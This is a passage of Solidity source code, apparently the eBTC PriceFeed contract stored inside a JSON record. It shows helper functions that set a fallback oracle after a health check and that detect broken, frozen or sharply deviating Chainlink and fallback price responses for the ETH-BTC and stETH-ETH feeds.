@param _fallbackCaller The address of the new IFallbackCaller compliant oracle\\\n    function setFallbackCaller(address _fallbackCaller) external requiresAuth {\n        // health check-up before officially set it up\n        IFallbackCaller newFallbackCaler = IFallbackCaller(_fallbackCaller);\n        FallbackResponse memory fallbackResponse;\n\n        if (_fallbackCaller != address(0)) {\n            try newFallbackCaler.getFallbackResponse() returns (\n                uint256 answer,\n                uint256 timestampRetrieved,\n                bool success\n            ) {\n                fallbackResponse.answer = answer;\n                fallbackResponse.timestamp = timestampRetrieved;\n                fallbackResponse.success = success;\n                if (\n                    !_fallbackIsBroken(fallbackResponse) &&\n                    !_responseTimeout(fallbackResponse.timestamp, newFallbackCaler.fallbackTimeout())\n                ) {\n                    address oldFallbackCaller = address(fallbackCaller);\n                    fallbackCaller = newFallbackCaler;\n                    emit FallbackCallerChanged(oldFallbackCaller, _fallbackCaller);\n                }\n            } catch {\n                emit UnhealthyFallbackCaller(_fallbackCaller, block.timestamp);\n            }\n        } else {\n            address oldFallbackCaller = address(fallbackCaller);\n            // NOTE: assume intentionally bricking fallback!!!\n            fallbackCaller = newFallbackCaler;\n            emit FallbackCallerChanged(oldFallbackCaller, _fallbackCaller);\n        }\n    }\n\n    // --- Helper functions ---\n\n    /// @notice Checks if Chainlink oracle is broken by checking both the current and previous responses\n    /// @dev Chainlink is considered broken if its current or previous round data is in any way bad. We check the previous round for two reasons.\n    /// @dev 1. It is necessary data for the price deviation check in case 1\n    /// @dev 2. Chainlink is the PriceFeed's preferred primary oracle - having two consecutive valid round responses adds peace of mind when using or returning to Chainlink.\n    /// @param _currentResponse The latest response from the Chainlink oracle\n    /// @param _prevResponse The previous response from the Chainlink oracle\n    /// @return A boolean indicating whether the Chainlink oracle is broken\n    function _chainlinkIsBroken(\n        ChainlinkResponse memory _currentResponse,\n        ChainlinkResponse memory _prevResponse\n    ) internal view returns (bool) {\n        return _badChainlinkResponse(_currentResponse) || _badChainlinkResponse(_prevResponse);\n    }\n\n    /// @notice Checks for a bad response from the Chainlink oracle\n    /// @dev A response is considered bad if the success value reports failure, or if the timestamp is invalid (0 or in the future)\n    /// @param _response The response from the Chainlink oracle to evaluate\n    /// @return A boolean indicating whether the Chainlink oracle response is bad\n\n    function _badChainlinkResponse(ChainlinkResponse memory _response) internal view returns (bool) {\n        // Check for response call reverted\n        if (!_response.success) {\n            return true;\n        }\n\n        // Check for an invalid timestamp that is 0, or in the future\n        if (\n            _response.timestampEthBtc == 0 ||\n            _response.timestampEthBtc > block.timestamp ||\n            _response.timestampStEthEth == 0 ||\n            _response.timestampStEthEth > block.timestamp\n        ) {\n            return true;\n        }\n\n        return false;\n    }\n\n    /// @notice Checks if the Chainlink oracle is frozen\n    /// @dev The oracle is considered frozen if either of the feed timestamps are older than the threshold specified by the static timeout thresholds\n    /// @param _response The response from the Chainlink oracle to evaluate\n    /// @return A boolean indicating whether the Chainlink oracle is frozen\n    function _chainlinkIsFrozen(ChainlinkResponse memory _response) internal view returns (bool) {\n        return\n            _responseTimeout(_response.timestampEthBtc, TIMEOUT_ETH_BTC_FEED) ||\n            _responseTimeout(_response.timestampStEthEth, TIMEOUT_STETH_ETH_FEED);\n    }\n\n    /// @notice Checks if the price change between Chainlink oracle rounds is above the maximum threshold allowed\n    /// @param _currentResponse The latest response from the Chainlink oracle\n    /// @param _prevResponse The previous response from the Chainlink oracle\n    /// @return A boolean indicating whether the price change from Chainlink oracle is above the maximum threshold allowed\n    function _chainlinkPriceChangeAboveMax(\n        ChainlinkResponse memory _currentResponse,\n        ChainlinkResponse memory _prevResponse\n    ) internal pure returns (bool) {\n        uint256 minPrice = EbtcMath._min(_currentResponse.answer, _prevResponse.answer);\n        uint256 maxPrice = EbtcMath._max(_currentResponse.answer, _prevResponse.answer);\n\n        /*\n         * Use the larger price as the denominator:\n         * - If price decreased, the percentage deviation is in relation to the the previous price.\n         * - If price increased, the percentage deviation is in relation to the current price.\n         */\n        uint256 percentDeviation = maxPrice > 0\n            ? ((maxPrice - minPrice) * EbtcMath.DECIMAL_PRECISION) / maxPrice\n            : 0;\n\n        // Return true if price has more than doubled, or more than halved.\n        return percentDeviation > MAX_PRICE_DEVIATION_FROM_PREVIOUS_ROUND;\n    }\n\n    function _fallbackIsBroken(FallbackResponse memory _response) internal view returns (bool) {\n        // Check for response call reverted\n        if (!_response.success) {\n            return true;\n        }\n        // Check for an invalid timeStamp that is 0, or in the future\n        if (_response.timestamp == 0 || _response.timestamp > block.timestamp) {\n            return true;\n        }\n        // Check for zero price (FallbackCaller must ensure that the price is not negative and return 0 if it is)\n        if (_response.answer == 0) {\n            return true;\n        }\n\n        return false;\n    }\n\n    /// @notice Checks if the fallback oracle is frozen by comparing the current timestamp with the timeout value.\n    /// @param _fallbackResponse Response from the fallback oracle to check\n    /// @return A boolean indicating whether the fallback oracle is frozen.\n    function _fallbackIsFrozen(\n        FallbackResponse memory _fallbackResponse\n    ) internal view returns (bool) {\n        return\n            _fallbackResponse.timestamp > 0 &&\n            _responseTimeout(_fallbackResponse.timestamp, fallbackCaller.fallbackTimeout());\n    }\n\n    function _responseTimeout(uint256 _timestamp, uint256 _timeout) internal view returns (bool) {\n        return block.timestamp - _timestamp > _timeout;\n    }\n\n    /// @notice Checks if both the Chainlink and fallback oracles are live, unbroken, and reporting similar prices.\n    /// @param _chainlinkResponse The latest response from the Chainlink oracle.\n    /// @param _prevChainlinkResponse The previous response from the Chainlink oracle.\n    /// @param _fallbackResponse The latest response from the fallback oracle.\n    /// @return A boolean indicating whether both oracles are live, unbroken, and reporting similar prices.\n\n    function _bothOraclesLiveAndUnbrokenAndSimilarPrice(\n        ChainlinkResponse memory _chainlinkResponse,\n        ChainlinkResponse memory _prevChainlinkResponse,\n        FallbackResponse memory _fallbackResponse\n    ) internal view returns (bool) {\n        // Return false if either oracle is broken or frozen\n        if (\n            _fallbackIsBroken(_fallbackResponse) ||\n            _fallbackIsFrozen(_fallbackResponse) ||\n            _chainlinkIsBroken(_chainlinkResponse, _prevChainlinkResponse) ||\n            _chainlinkIsFrozen(_chainlinkResponse)\n        ) {\n            return false;\n        }\n\n        return _bothOraclesSimilarPrice(_chainlinkResponse, _fallbackResponse);\n    }\n\n    /// @notice Checks if the prices reported by the Chainlink and fallback oracles are similar, within the maximum deviation specified by MAX_PRICE_DIFFERENCE_BETWEEN_ORACLES.\n    /// @param _chainlinkResponse The response from the Chainlink oracle.\n    /// @param _fallbackResponse The response from the fallback oracle.\n    /// @return A boolean indicating whether the prices reported by both oracles are similar.\n\n    function _bothOraclesSimilarPrice(\n        ChainlinkResponse memory _chainlinkResponse,\n        FallbackResponse memory _fallbackResponse\n    ) internal pure returns (bool) {\n        // Get the relative price difference between the oracles. Use the lower price as the denominator, i.e. the reference for the calculation.\n        uint256 minPrice = EbtcMath._min(_fallbackResponse.answer, _chainlinkResponse.answer);\n        if (minPrice == 0) return false;\n        uint256 maxPrice = EbtcMath._max(_fallbackResponse.answer, _chainlinkResponse.answer);\n        uint256 percentPriceDifference = ((maxPrice - minPrice) * EbtcMath.DECIMAL_PRECISION) /\n            minPrice;\n\n        /*\n         * Return true if the relative price difference is <= MAX_PRICE_DIFFERENCE_BETWEEN_ORACLES: if so, we assume both oracles are probably reporting\n         * the honest market price, as it is unlikely that both have been broken/hacked and are still in-sync.\n         */\n        return percentPriceDifference <= MAX_PRICE_DIFFERENCE_BETWEEN_ORACLES;\n    }\n\n    /// @notice Changes the status of the oracle state machine\n    /// @param _status The new status of the contract.\n    function _changeStatus(Status _status) internal {\n        status = _status;\n        emit PriceFeedStatusChanged(_status);\n    }\n\n    /// @notice Stores the latest valid price.\n    /// @param _currentPrice The price to be stored.\n    function _storePrice(uint256 _currentPrice) internal {\n        lastGoodPrice = _currentPrice;\n        emit LastGoodPriceUpdated(_currentPrice);\n    }\n\n    /// @notice Stores the price reported by the fallback oracle.\n    /// @param _fallbackResponse The latest response from the fallback oracle.\n    /// @return The price reported by the fallback oracle.\n    function _storeFallbackPrice(\n        FallbackResponse memory _fallbackResponse\n    ) internal returns (uint256) {\n        _storePrice(_fallbackResponse.answer);\n        return _fallbackResponse.answer;\n    }\n\n    /// @notice Stores the price reported by the Chainlink oracle.\n    /// @param _answer The latest price reported by the Chainlink oracle.\n    /// @return The price reported by the Chainlink oracle.\n    function _storeChainlinkPrice(uint256 _answer) internal returns (uint256) {\n        _storePrice(_answer);\n\n        return _answer;\n    }\n\n    // --- Oracle response wrapper functions ---\n\n    /// @notice Retrieves the latest response from the fallback oracle. If the fallback oracle address is set to the zero address, it returns a failing struct.\n    /// @return fallbackResponse The latest response from the fallback oracle.\n\n    function _getCurrentFallbackResponse()\n        internal\n        view\n        returns (FallbackResponse memory fallbackResponse)\n    {\n        if (address(fallbackCaller) != address(0)) {\n            try fallbackCaller.getFallbackResponse() returns (\n                uint256 answer,\n                uint256 timestampRetrieved,\n                bool success\n            ) {\n                fallbackResponse.answer = answer;\n                fallbackResponse.timestamp = timestampRetrieved;\n                fallbackResponse.success = success;\n            } catch {\n                // If call to Fallback reverts, return a zero response with success = false\n            }\n        } // If unset we return a zero response with success = false\n\n        // Return is implicit\n    }\n\n    /// @notice Fetches Chainlink responses for the current round of data for both ETH-BTC and stETH-ETH price feeds.\n    /// @return chainlinkResponse A struct containing data retrieved from the price feeds, including the round IDs, timestamps, aggregated price, and a success flag.\n    function _getCurrentChainlinkResponse()\n        internal\n        view\n        returns (ChainlinkResponse memory chainlinkResponse)\n    {\n        // Fetch decimals for both feeds:\n        uint8 ethBtcDecimals;\n        uint8 stEthEthDecimals;\n\n        try ETH_BTC_CL_FEED.decimals() returns (uint8 decimals) {\n            // If call to Chainlink succeeds, record the current decimal precision\n            ethBtcDecimals = decimals;\n        } catch {\n            // If call to Chainlink aggregator reverts, return a zero response with success = false\n            return chainlinkResponse;\n        }\n\n        try STETH_ETH_CL_FEED.decimals() returns (uint8 decimals) {\n            // If call to Chainlink succeeds, record the current decimal precision\n            stEthEthDecimals = decimals;\n        } catch {\n            // If call to Chainlink aggregator reverts, return a zero response with success = false\n            return chainlinkResponse;\n        }\n\n        // Try to get latest prices data:\n        int256 ethBtcAnswer;\n        int256 stEthEthAnswer;\n        try ETH_BTC_CL_FEED.latestRoundData() returns (\n            uint80 roundId,\n            int256 answer,\n            uint256,\n            /* startedAt */\n            uint256 timestamp,\n            uint80 /* answeredInRound */\n        ) {\n            ethBtcAnswer = answer;\n            chainlinkResponse.roundEthBtcId = roundId;\n            chainlinkResponse.timestampEthBtc = timestamp;\n        } catch {\n            // If call to Chainlink aggregator reverts, return a zero response with success = false\n            return chainlinkResponse;\n        }\n\n        try STETH_ETH_CL_FEED.latestRoundData() returns (\n            uint80 roundId,\n            int256 answer,\n            uint256,\n            /* startedAt */\n            uint256 timestamp,\n            uint80 /* answeredInRound */\n        ) {\n            stEthEthAnswer = answer;\n            chainlinkResponse.roundStEthEthId = roundId;\n            chainlinkResponse.timestampStEthEth = timestamp;\n        } catch {\n            // If call to Chainlink aggregator reverts, return a zero response with success = false\n            return chainlinkResponse;\n        }\n\n        if (\n            _checkHealthyCLResponse(chainlinkResponse.roundEthBtcId, ethBtcAnswer) &&\n            _checkHealthyCLResponse(chainlinkResponse.roundStEthEthId, stEthEthAnswer)\n        ) {\n            chainlinkResponse.answer = _formatClAggregateAnswer(\n                ethBtcAnswer,\n                stEthEthAnswer,\n                ethBtcDecimals,\n                stEthEthDecimals\n            );\n        } else {\n            return chainlinkResponse;\n        }\n\n        chainlinkResponse.success = true;\n    }\n\n    /// @notice Fetches Chainlink responses for the previous round of data for both ETH-BTC and stETH-ETH price feeds.\n    /// @param _currentRoundEthBtcId The current round ID for the ETH-BTC price feed.\n    /// @param _currentRoundStEthEthId The current round ID for the stETH-ETH price feed.\n    /// @return prevChainlinkResponse A struct containing data retrieved from the price feeds, including the round IDs, timestamps, aggregated price, and a success flag.\n    function _getPrevChainlinkResponse(\n        uint80 _currentRoundEthBtcId,\n        uint80 _currentRoundStEthEthId\n    ) internal view returns (ChainlinkResponse memory prevChainlinkResponse) {\n        // If first round, early return\n        // Handles revert from underflow in _currentRoundEthBtcId - 1\n        // and _currentRoundStEthEthId - 1\n        // Behavior should be indentical to following block if this revert was caught\n        if (_currentRoundEthBtcId == 0 || _currentRoundStEthEthId == 0) {\n            return prevChainlinkResponse;\n        }\n\n        // Fetch decimals for both feeds:\n        uint8 ethBtcDecimals;"
    }
  ]
}